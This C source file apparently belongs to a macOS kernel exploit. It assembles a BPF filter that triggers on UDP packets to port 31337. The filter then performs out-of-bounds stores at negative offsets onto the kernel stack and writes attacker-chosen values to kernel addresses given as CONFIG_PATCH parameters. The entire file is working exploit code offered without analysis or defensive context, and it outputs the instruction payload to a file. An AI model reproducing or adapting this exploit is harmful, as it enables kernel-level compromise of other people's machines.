#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/bpf.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <string.h>
#include <assert.h>
#include <mach-o/loader.h>
#include "common.h"
//
// snow!

int g_argc;
char **g_argv;

static unsigned int c(char *key) {
    int len = strlen(key);
    for(int i = 0; i < g_argc; i++) {
        char *arg = g_argv[i];
        if(arg[0] == '-' && arg[1] == 'D' && !memcmp(arg + 2, key, len) && arg[2 + len] == '=') {
            return (unsigned int) strtoll(arg + 2 + len + 3, NULL, 16);
        }
    }
    abort();
}
//
int main(int argc, char **argv) {
    g_argc = argc - 1;
    g_argv = argv + 1;
    struct bpf_insn *insns = calloc(512, sizeof(struct bpf_insn));
    int i = 0;
    int j = (-0x1000 + 0x64)/4;
    int last = 0xf9c/4;
    
#define ADD insns[i++] = (struct bpf_insn) 
#define ADD2(code, k) do { ADD BPF_STMT(BPF_LDX|BPF_IMM, code); \
                           ADD BPF_STMT(BPF_STX, j++); \
                           ADD BPF_STMT(BPF_LDX|BPF_IMM, k); \
                           ADD BPF_STMT(BPF_STX, j++); } while(0)
#define ADD2_STX(k) do { int _k = (k); \
                         if(_k & 3) { printf("%x!\n", _k); abort(); } \
                         int _q = _k/4; \
                         ADD BPF_STMT(BPF_LDX|BPF_IMM, BPF_STX); \
                         ADD BPF_STMT(BPF_STX, j++); \
                         if(_q != last) ADD BPF_STMT(BPF_ALU|BPF_ADD|BPF_K, _q - last); \
                         last = _q; \
                         ADD BPF_STMT(BPF_MISC|BPF_TAX, 0); \
                         ADD BPF_STMT(BPF_STX, j++); } while(0)
    // hack_hdr_on_stack -> mh_next (0) -> mh_data (c)
    // Is this actually my packet?
    // Loopback != ethernet
    // 0 - family
    // 4- version, ihl, tos, tl
    // 8- id, flags, frag offset
    // 12- ttl, protocol, header cksum
    // 16- source address
    //ADD BPF_STMT(BPF_STX, 0xdeadbeef); // A should = SP + 4 -0x1000
    // 20- dest address
    // +0- source port, dest port [X+4, X+6] 24?
    // +4- length, cksum [X+8, X+10] 28?
    // +8- data... [X+12...] 32?
    ADD BPF_STMT(BPF_LD+BPF_W+BPF_ABS, 0);
    ADD BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0x02000000, 0, 7);
    ADD BPF_STMT(BPF_LD+BPF_B+BPF_ABS, 13);
    ADD BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, IPPROTO_UDP, 0, 5);
    ADD BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 10);
    ADD BPF_JUMP(BPF_JMP+BPF_JSET+BPF_K, 0x1fff, 3, 0);
    ADD BPF_STMT(BPF_LDX+BPF_B+BPF_MSH, 4);
    ADD BPF_STMT(BPF_LD+BPF_H+BPF_IND, 6);
    ADD BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 31337, 1, 0);
    ADD BPF_STMT(BPF_RET+BPF_K, (u_int)0);
    //ADD BPF_STMT(BPF_RET+BPF_K, (u_int)-1);

    // It is.
    
    // copied from tester, ought to work
    ADD BPF_STMT(BPF_LDX|BPF_MEM, 23);
    ADD BPF_STMT(BPF_MISC|BPF_TXA, 0);
    ADD BPF_STMT(BPF_ALU|BPF_ADD|BPF_K, -36*4 - 0x1000);
    ADD BPF_STMT(BPF_MISC|BPF_TAX, 0);
    ADD BPF_STMT(BPF_STX, (-0x1000 + 4)/4);

    ADD BPF_STMT(BPF_LDX|BPF_MEM, 20);
    ADD BPF_STMT(BPF_STX, (-0x1000 + 8)/4);

    ADD BPF_STMT(BPF_ALU|BPF_ADD|BPF_K, 4);
    ADD BPF_STMT(BPF_MISC|BPF_TAX, 0);
    ADD BPF_STMT(BPF_STX, 20);

    ADD BPF_STMT(BPF_ALU|BPF_ADD|BPF_K, 0x60);
    ADD BPF_STMT(BPF_MISC|BPF_TAX, 0);
    ADD BPF_STMT(BPF_STX, (-0x1000 + 0x24)/4);

    ADD BPF_STMT(BPF_LDX|BPF_IMM, 0);
    ADD BPF_STMT(BPF_STX, (-0x1000 + 0)/4);
    ADD BPF_STMT(BPF_LDX|BPF_IMM, 1);
    ADD BPF_STMT(BPF_STX, (-0x1000 + 0x60)/4);

    ADD BPF_STMT(BPF_ALU|BPF_RSH|BPF_K, 2);
    ADD BPF_STMT(BPF_ALU|BPF_NEG, 0); // A = -(buf + 0x64)/4 = -(mem - 0x9c)/4

    ADD2(BPF_LDX|BPF_IMM, c("CONFIG_PATCH1_TO"));
    ADD2_STX(c("CONFIG_PATCH1"));

    ADD2(BPF_LDX|BPF_IMM, 0);
    ADD2_STX(c("CONFIG_PATCH2"));

    ADD2(BPF_LDX|BPF_IMM, c("CONFIG_PATCH3_TO"));
    ADD2_STX(c("CONFIG_PATCH3"));

    ADD2(BPF_LDX|BPF_IMM, c("CONFIG_PATCH4_TO"));
    ADD2_STX(c("CONFIG_PATCH4"));

    ADD2(BPF_LDX|BPF_IMM, 1);
    ADD2_STX(c("CONFIG_PATCH5"));
    ADD2_STX(c("CONFIG_PATCH6"));

    
    ADD2(BPF_RET|BPF_K, 0);

    ADD BPF_STMT(BPF_RET|BPF_K, (u_int)0);

#undef ADD
    printf("%d\n", i);
    assert(i < 512);
    w((struct buf){(void*)insns, i * sizeof(struct bpf_insn)}, "insns.txt", 0);
    return 0;
}
